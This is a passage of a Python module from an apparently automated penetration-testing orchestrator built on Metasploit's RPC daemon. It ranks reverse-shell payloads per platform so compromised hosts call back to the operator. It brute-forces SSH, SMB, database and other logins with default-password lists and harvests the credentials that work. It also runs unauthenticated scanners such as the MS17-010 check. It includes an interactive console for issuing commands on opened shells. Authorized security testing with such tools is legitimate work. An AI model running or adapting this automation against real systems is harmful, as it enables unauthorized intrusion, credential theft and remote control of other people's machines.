    parts = full.split("/")
    if len(parts) >= 2 and parts[1] in _PLATFORMS:
        seg = parts[1]
        return None if seg == "multi" else seg
    return None


def _platform_from_host(host):
    text = f"{getattr(host, 'os_match', '')}".lower()
    if not text:
        return None
    if "windows" in text:
        return "windows"
    if "linux" in text:
        return "linux"
    if "mac os" in text or "osx" in text or "darwin" in text:
        return "osx"
    if any(x in text for x in ("unix", "bsd", "solaris", "aix")):
        return "unix"
    return None


def _is_x64(host):
    arch = f"{getattr(host, 'arch', '')}".lower()
    if arch in ("x64", "x86_64", "amd64", "64", "x86-64"):
        return True
    text = f"{getattr(host, 'os_match', '')}".lower()
    return "x64" in text or "64-bit" in text or "x86_64" in text


def _payload_prefs(platform, x64):
    """Preferred reverse payloads for a platform, shell payloads first. The goal is
    to prove code execution (a shell calling back is proof the host is compromised),
    not to maintain rich post-exploitation access, so command and native shell
    payloads are preferred. They also avoid a meterpreter option-serialization issue
    that some msfrpcd builds reject (AutoLoadExtensions must be a scalar), which
    blocks meterpreter payloads outright. Meterpreter stays as a last-resort fallback
    for modules that only offer it."""
    prefs = []
    if platform == "windows":
        if x64:
            prefs += [
                "windows/x64/shell/reverse_tcp",
                "windows/x64/shell_reverse_tcp",
            ]
        prefs += [
            "windows/shell/reverse_tcp",
            "windows/shell_reverse_tcp",
        ]
    elif platform == "linux":
        if x64:
            prefs += [
                "linux/x64/shell/reverse_tcp",
                "linux/x64/shell_reverse_tcp",
            ]
        prefs += [
            "linux/x86/shell/reverse_tcp",
            "linux/x86/shell_reverse_tcp",
        ]
    elif platform == "osx":
        prefs += [
            "osx/x64/shell_reverse_tcp",
        ]
    elif platform == "unix":
        # Order by reliability on old and hardened targets. Interpreter payloads
        # (perl, python) are almost always present and need no shell networking
        # features. netcat and telnet (cmd/unix/reverse) follow. reverse_bash is
        # LAST: it depends on bash /dev/tcp, which many targets (older
        # Metasploitable-era bash, dash, bash built without net redirections)
        # do not provide, so it fires but the callback never opens.
        prefs += [
            "cmd/unix/reverse_perl",
            "cmd/unix/reverse_python",
            "cmd/unix/reverse_netcat",
            "cmd/unix/reverse_openssl",
            "cmd/unix/reverse",
            "cmd/unix/reverse_bash",
        ]
    elif platform == "java":
        prefs += ["java/jsp_shell_reverse_tcp"]
    elif platform == "php":
        prefs += ["php/reverse_php"]
    elif platform == "python":
        prefs += ["python/shell_reverse_tcp"]
    # generic shell fallbacks come before any platform meterpreter below, so a
    # module offering only meterpreter plus a generic shell still proves execution
    # with the shell. Meterpreter platform payloads are appended last as the true
    # last resort for modules that offer nothing else.
    prefs += ["generic/shell_reverse_tcp", "cmd/unix/reverse_perl",
              "cmd/unix/reverse_python", "cmd/unix/reverse_netcat",
              "cmd/unix/reverse", "cmd/unix/reverse_bash"]
    if platform == "windows":
        if x64:
            prefs += ["windows/x64/meterpreter/reverse_tcp",
                      "windows/x64/meterpreter_reverse_tcp"]
        prefs += ["windows/meterpreter/reverse_tcp",
                  "windows/meterpreter_reverse_tcp"]
    elif platform == "linux":
        if x64:
            prefs += ["linux/x64/meterpreter/reverse_tcp",
                      "linux/x64/meterpreter_reverse_tcp"]
        prefs += ["linux/x86/meterpreter/reverse_tcp",
                  "linux/x86/meterpreter_reverse_tcp"]
    elif platform in ("java", "php", "python", "osx"):
        prefs += [f"{platform}/meterpreter/reverse_tcp"]
    return prefs


def _select_payloads(exploit, full_module, host):
    """Return compatible reverse payloads for this module in reliability order,
    best first. This is the ordered form of _select_payload used by the fire
    fallback: if the first payload fires but never calls back, the next is tried.
    Preference order comes first (platform command shells, then generic, then
    meterpreter), followed by any remaining reverse payloads, with bind payloads
    last. Returns [] when the module exposes no payloads."""
    try:
        compat = set(exploit.payloads or [])
    except Exception as e:
        logger.warning("could not list payloads for %s: %s", full_module, e)
        return []
    if not compat:
        return []
    platform = _platform_from_module(full_module) or _platform_from_host(host)
    x64 = _is_x64(host)
    ordered = []
    seen = set()
    for p in _payload_prefs(platform, x64):
        if p in compat and p not in seen:
            ordered.append(p)
            seen.add(p)
    # remaining reverse (non-bind) payloads the prefs did not name, shells first
    rest_shell = sorted(p for p in compat if p not in seen
                        and "reverse" in p and "bind" not in p
                        and "meterpreter" not in p)
    rest_rev = sorted(p for p in compat if p not in seen
                      and "reverse" in p and "bind" not in p)
    for p in rest_shell + rest_rev:
        if p not in seen:
            ordered.append(p)
            seen.add(p)
    # bind and anything else last, so a callback-based payload is always tried first
    if not ordered:
        tail = sorted(compat)
        if tail:
            logger.warning("no reverse payload for %s; falling back to %s",
                           full_module, tail[0])
            return tail[:1]
    return ordered


def _select_payload(exploit, full_module, host):
    """Pick the single best reverse payload (first of _select_payloads). Kept for
    callers that want one payload without the fallback loop."""
    ordered = _select_payloads(exploit, full_module, host)
    return ordered[0] if ordered else None


def _is_user_opt(name):
    """Option name that takes a username (USERNAME, SMBUser, HttpUsername, ...)."""
    n = name.lower()
    return n in ("user", "login") or n.endswith("user") or n.endswith("username")


def _is_pass_opt(name):
    """Option name that takes a password (PASSWORD, SMBPass, HttpPassword, ...)."""
    n = name.lower()
    return n == "pass" or n.endswith("pass") or n.endswith("password")


def _apply_options(mod, pairs):
    """Set each (key, value) the module actually declares as an option. Returns a
    list of (key, value, reason) for any set the module rejected (bad type, value
    not in enums, and so on). A rejected set is recorded and surfaced, never
    swallowed, so a flaw is never hidden behind an option that silently did not
    take. Keys the module does not declare are skipped without comment."""
    failures = []
    declared = set(mod.options)
    for key, val in pairs:
        if key not in declared:
            continue
        try:
            mod[key] = val
        except Exception as e:
            failures.append((key, val, str(e)))
    return failures


def _session_targets(s, rhost):
    """True if a session dict points at rhost, by session or target host, or by the
    host part of tunnel_peer (ip:port)."""
    if not rhost:
        return False
    if s.get("session_host") == rhost or s.get("target_host") == rhost:
        return True
    peer = str(s.get("tunnel_peer") or "")
    return peer.rsplit(":", 1)[0] == rhost


def _lhost_for(target):
    """Source IP the kernel would use to reach target. UDP connect consults the
    routing table without sending packets, so this works offline."""
    fam = socket.AF_INET6 if ":" in target else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


__all__ = ["MsfConfig", "MsfClient", "MsfUnavailable", "RANK_VALUES"]


# --- credential brute forcing ----------------------------------------------
# Seclists base lists the locate() resolver searches for. The orchestrator stores
# the resolved absolute paths in .orchestration_config and reuses them; if locate
# returns nothing it falls back to the small built-in lists below.
BRUTE_USER_SEED = "top-usernames-shortlist.txt"
BRUTE_PASS_SEED = "xato-net-10-million-passwords.txt"

_BUILTIN_USERS = [
    "root", "admin", "administrator", "user", "guest", "msfadmin",
    "postgres", "mysql", "sa", "tomcat", "ubuntu", "oracle", "test",
    "service", "operator",
]
_BUILTIN_PASSWORDS = [
    "", "password", "123456", "admin", "root", "toor", "msfadmin",
    "postgres", "mysql", "sa", "tomcat", "changeme", "letmein", "12345678",
    "password123", "welcome", "test", "guest", "qwerty", "abc123",
]

# nmap service name (lowercased) -> MSF login scanner. RDP is intentionally
# absent: stock MSF has no working rdp_login, so RDP services are skipped.
_LOGIN_MODULES = {
    "ssh": "auxiliary/scanner/ssh/ssh_login",
    "ftp": "auxiliary/scanner/ftp/ftp_login",
    "telnet": "auxiliary/scanner/telnet/telnet_login",
    "mysql": "auxiliary/scanner/mysql/mysql_login",
    "postgresql": "auxiliary/scanner/postgres/postgres_login",
    "postgres": "auxiliary/scanner/postgres/postgres_login",
    "ms-sql-s": "auxiliary/scanner/mssql/mssql_login",
    "mssql": "auxiliary/scanner/mssql/mssql_login",
    "microsoft-ds": "auxiliary/scanner/smb/smb_login",
    "netbios-ssn": "auxiliary/scanner/smb/smb_login",
    "smb": "auxiliary/scanner/smb/smb_login",
    "vnc": "auxiliary/scanner/vnc/vnc_login",
    "redis": "auxiliary/scanner/redis/redis_login",
}
# Port fallback when the nmap service name is unrecognized.
_LOGIN_PORTS = {
    22: "auxiliary/scanner/ssh/ssh_login",
    21: "auxiliary/scanner/ftp/ftp_login",
    23: "auxiliary/scanner/telnet/telnet_login",
    3306: "auxiliary/scanner/mysql/mysql_login",
    5432: "auxiliary/scanner/postgres/postgres_login",
    1433: "auxiliary/scanner/mssql/mssql_login",
    445: "auxiliary/scanner/smb/smb_login",
    139: "auxiliary/scanner/smb/smb_login",
    5900: "auxiliary/scanner/vnc/vnc_login",
    6379: "auxiliary/scanner/redis/redis_login",
}

_BRUTE_SUCCESS_RE = re.compile(r"Success:\s*'([^']*)'")
_BRUTE_SUCCESS_ALT_RE = re.compile(r"Login Successful:\s*([^\s,()]+)",
                                   re.IGNORECASE)


def login_module_for(service_name, port):
    """The MSF login scanner for a service, by nmap name then port, or "" if the
    service has no login scanner we run (e.g. http, rdp)."""
    if service_name:
        mod = _LOGIN_MODULES.get(service_name.strip().lower())
        if mod:
            return mod
    return _LOGIN_PORTS.get(int(port) if port else 0, "")


# nmap service name (lowercased) -> unauthenticated/misconfiguration auxiliary
# modules that prove access with no credentials. They run and report; MSF's [+]
# lines are the proof. Curated to well-known stock modules; extend per site.
_UNAUTH_MODULES = {
    "ftp": ["auxiliary/scanner/ftp/anonymous"],
    "microsoft-ds": ["auxiliary/scanner/smb/smb_ms17_010",
                     "auxiliary/scanner/smb/smb_enumshares",
                     "auxiliary/scanner/smb/smb_enumusers"],
    "netbios-ssn": ["auxiliary/scanner/smb/smb_ms17_010",
                    "auxiliary/scanner/smb/smb_enumshares"],
    "smb": ["auxiliary/scanner/smb/smb_ms17_010",
            "auxiliary/scanner/smb/smb_enumshares"],
    "redis": ["auxiliary/scanner/redis/redis_server"],
    "mongodb": ["auxiliary/scanner/mongodb/mongodb_login"],
    "elasticsearch": ["auxiliary/scanner/elasticsearch/indices_enum"],
    "couchdb": ["auxiliary/scanner/couchdb/couchdb_enum"],
    "rsync": ["auxiliary/scanner/rsync/modules_list"],
    "nfs": ["auxiliary/scanner/nfs/nfsmount"],
    "vnc": ["auxiliary/scanner/vnc/vnc_none_auth"],
    "memcached": ["auxiliary/gather/memcached_extractor"],
    "java-rmi": ["auxiliary/scanner/misc/java_rmi_server"],
}
# Port fallback when the nmap service name is unrecognized.
_UNAUTH_PORTS = {
    21: ["auxiliary/scanner/ftp/anonymous"],
    445: ["auxiliary/scanner/smb/smb_ms17_010",
          "auxiliary/scanner/smb/smb_enumshares"],
    139: ["auxiliary/scanner/smb/smb_ms17_010",
          "auxiliary/scanner/smb/smb_enumshares"],
    6379: ["auxiliary/scanner/redis/redis_server"],
    27017: ["auxiliary/scanner/mongodb/mongodb_login"],
    9200: ["auxiliary/scanner/elasticsearch/indices_enum"],
    5984: ["auxiliary/scanner/couchdb/couchdb_enum"],
    873: ["auxiliary/scanner/rsync/modules_list"],
    2049: ["auxiliary/scanner/nfs/nfsmount"],
    5900: ["auxiliary/scanner/vnc/vnc_none_auth"],
    11211: ["auxiliary/gather/memcached_extractor"],
    1099: ["auxiliary/scanner/misc/java_rmi_server"],
}


def unauth_modules_for(service_name, port):
    """Unauth/misconfig auxiliary modules for a detected service, by nmap service
    name first, then port. Returns a list, possibly empty."""
    mods = []
    if service_name:
        mods = _UNAUTH_MODULES.get(service_name.strip().lower(), [])
    if not mods and port:
        mods = _UNAUTH_PORTS.get(int(port), [])
    return list(mods)


def locate_wordlist(filename):
    """`locate <filename>`, returning the best existing absolute path or "".
    Prefers a hit under a seclists directory, else the first existing hit."""
    try:
        proc = subprocess.run(
            ["locate", filename], stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
            timeout=20, text=True)
    except (OSError, subprocess.SubprocessError):
        return ""
    hits = [ln.strip() for ln in proc.stdout.splitlines()
            if ln.strip() and os.path.isfile(ln.strip())]
    if not hits:
        return ""
    seclists = [h for h in hits if "seclists" in h.lower()]
    return (seclists or hits)[0]


def write_builtin_wordlists():
    """Write the small built-in user/password lists to temp files and return
    (user_path, pass_path). The caller removes them when the brute phase ends."""
    import tempfile

    def _write(lines):
        fd, path = tempfile.mkstemp(prefix=".brute_", suffix=".lst")
        with os.fdopen(fd, "w") as f:
            f.write("\n".join(lines) + "\n")
        return path

    return _write(_BUILTIN_USERS), _write(_BUILTIN_PASSWORDS)


def _parse_brute_creds(data, service, port, module):
    """Credentials from a login scanner's console output. MSF prints
    `[+] host:port - Success: 'user:pass' (...)`. STOP_ON_SUCCESS yields one
    success per service, but several are tolerated and de-duplicated. Session
    attribution is NOT done here: MSF broadcasts the 'session N opened' event to
    every console reading concurrently, so scraping it double-counts other modules'
    sessions. Sessions are read from the session list instead (see
    MsfClient._brute_sessions_for)."""
    raw = []
    for line in data.splitlines():
        m = _BRUTE_SUCCESS_RE.search(line) or _BRUTE_SUCCESS_ALT_RE.search(line)
        if m and m.group(1) not in raw:
            raw.append(m.group(1))
    creds = []
    for item in raw:
        user, sep, pw = item.partition(":")
        creds.append(Credential(service=service or "", port=int(port or 0),
                                username=user, password=pw if sep else "",
                                module=module))
    return creds


# --- session console: python msf.py [-i ID | -k ID... | -K] ----------------
# Sessions opened during a run live inside msfrpcd, not in this process, so they
# are reachable from any RPC client while the daemon runs. This entry point lists
# them, attaches an interactive prompt to one, or closes one, several, or all,
# reusing the run's stored password.

_SESSION_CONFIG_FILE = ".orchestration_config"


def _load_rpc_password(explicit):
    if explicit:
        return explicit
    env = os.environ.get("MSF_RPC_PASS")
    if env:
        return env
    try:
        import json
        with open(_SESSION_CONFIG_FILE) as f:
            pw = json.load(f).get("msf_rpc_password", "")
        if isinstance(pw, str) and pw:
            return pw
    except (OSError, ValueError):
        pass
    return ""


def _print_sessions(sessions):
    from rich import box
    from rich.console import Console
    from rich.table import Table
    console = Console()
    if not sessions:
        console.print("no open sessions (the daemon may have been restarted, or a "
                      "run with no open sessions stopped it on exit)")
        return
    t = Table(box=box.SIMPLE_HEAD)
    t.add_column("ip", no_wrap=True)
    t.add_column("host", overflow="ellipsis")
    t.add_column("module", overflow="ellipsis")
    t.add_column("session")
    t.add_column("payload", overflow="ellipsis")
    for sid, meta in sessions.items():
        ip = (meta.get("session_host") or meta.get("target_host")
              or _peer_host(meta.get("tunnel_peer", "")))
        module = meta.get("via_exploit") or "-"
        payload = (meta.get("via_payload") or "").removeprefix("payload/") or "-"
        t.add_row(str(ip or "-"), "-", module, str(sid), payload)
    console.print(t)


def _sessions_json(sessions):
    """Emit the live session list as JSON on stdout, for programmatic callers such
    as the console. Same fields the table shows, machine-readable."""
    import json as _json
    out = []
    for sid, meta in (sessions or {}).items():
        ip = (meta.get("session_host") or meta.get("target_host")
              or _peer_host(meta.get("tunnel_peer", "")))
        out.append({
            "session_id": str(sid),
            "ip": str(ip or ""),
            "module": meta.get("via_exploit") or "",
            "payload": (meta.get("via_payload") or "").removeprefix("payload/"),
            "type": str(meta.get("type", "")),
            "info": str(meta.get("info", "")),
        })
    print(_json.dumps({"sessions": out}))


def _peer_host(peer):
    """IP from a 'host:port' tunnel peer, tolerating IPv6 in brackets."""
    peer = (peer or "").strip()
    if peer.startswith("[") and "]" in peer:
        return peer[1:peer.index("]")]
    return peer.rsplit(":", 1)[0] if ":" in peer else peer


def _kill_sessions(client, ids):
    """Stop each session id in turn, printing one result line per id. Returns the
    number actually closed."""
    closed = 0
    for sid in ids:
        try:
            ok = client.session_stop(sid)
        except Exception as e:
            print(f"session {sid}: error closing: {e}")
            continue
        if ok:
            print(f"session {sid}: closed")
            closed += 1
        else:
            print(f"session {sid}: not found")
    return closed


def _session_console(client, sid):
    handle, stype = client.session_handle(sid)
    if handle is None:
        if stype:
            print(f"session {sid} is type '{stype}', which is not an interactive "
                  f"shell or meterpreter console and cannot be attached here.")
            print("use the Metasploit console directly for this session type.")
        else:
            print(f"session {sid} not found. open sessions:")
            _print_sessions(client.session_list())
        return
    print(f"attached to session {sid} ({stype}); 'exit' or Ctrl-D detaches "
          "(the session stays open)\n")
    try:
        handle.read()                      # drain any pending banner
    except Exception:
        pass
    while True:
        try:
            cmd = input("session> ")
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if cmd.strip() in ("exit", "quit"):
            break
        if not cmd.strip():
            continue
        try:
            if stype == "meterpreter":
                sys.stdout.write(handle.run_with_output(cmd + "\n", ["\n"]))
            else:
                handle.write(cmd + "\n")
                time.sleep(0.4)
                sys.stdout.write(handle.read())
            sys.stdout.flush()
        except Exception as e:
            print(f"error: {e}")
    print("detached; session left open in msfrpcd")


def _main(argv=None):
    import argparse
    p = argparse.ArgumentParser(
        prog="msf.py",
        description="list, attach to, or close sessions in the orchestrator's "
                    "msfrpcd")
    action = p.add_mutually_exclusive_group()
    action.add_argument("-i", "--interact", metavar="ID",
                        help="attach an interactive prompt to a session id")
    action.add_argument("-k", "--kill", nargs="+", metavar="ID",
                        help="close the given session id(s)")
    action.add_argument("-K", "--kill-all", action="store_true",
                        help="close all open sessions")
    p.add_argument("-y", "--yes", action="store_true",
                   help="skip the confirmation prompt for --kill-all")
    p.add_argument("--json", action="store_true",
                   help="print the session list as JSON (for the console)")
    p.add_argument("--host", default=None)
    p.add_argument("--port", type=int, default=None)
    p.add_argument("--user", default=None)
    p.add_argument("--password", default=None,
                   help=f"else MSF_RPC_PASS env, else {_SESSION_CONFIG_FILE}")
    ssl = p.add_mutually_exclusive_group()
    ssl.add_argument("--ssl", dest="ssl", action="store_true", default=None)
    ssl.add_argument("--no-ssl", dest="ssl", action="store_false")
    args = p.parse_args(argv)
    cfg = MsfConfig.from_env(
        host=args.host, port=args.port, username=args.user, ssl=args.ssl,
        password=_load_rpc_password(args.password))
    if not cfg.password:
        sys.exit("no msfrpcd password: pass --password, set MSF_RPC_PASS, or run "
                 f"from the directory holding {_SESSION_CONFIG_FILE}")
    try:
        client = MsfClient(cfg).connect()
    except MsfUnavailable as e:
        sys.exit(f"{e}\nis msfrpcd still running? check: pgrep -af msfrpcd")
    try:
        if args.kill_all:
            sessions = client.session_list()
            if not sessions:
                print("no open sessions to close")
                return
            ids = list(sessions.keys())
            if not args.yes:
                if not sys.stdin.isatty():
                    sys.exit("refusing to close all sessions non-interactively; "
                             "pass --yes")
                _print_sessions(sessions)
                resp = input(f"\nClose all {len(ids)} session(s)? [y/N] "
                             ).strip().lower()
                if resp not in ("y", "yes"):
                    sys.exit("aborted")
            n = _kill_sessions(client, ids)
            print(f"closed {n} of {len(ids)} session(s)")
        elif args.kill:
            n = _kill_sessions(client, args.kill)
            print(f"closed {n} of {len(args.kill)} session(s)")
        elif args.interact:
            _session_console(client, args.interact)
        elif args.json:
            _sessions_json(client.session_list())
        else:
            _print_sessions(client.session_list())
    finally:
        client.close()


if __name__ == "__main__":
    _main()
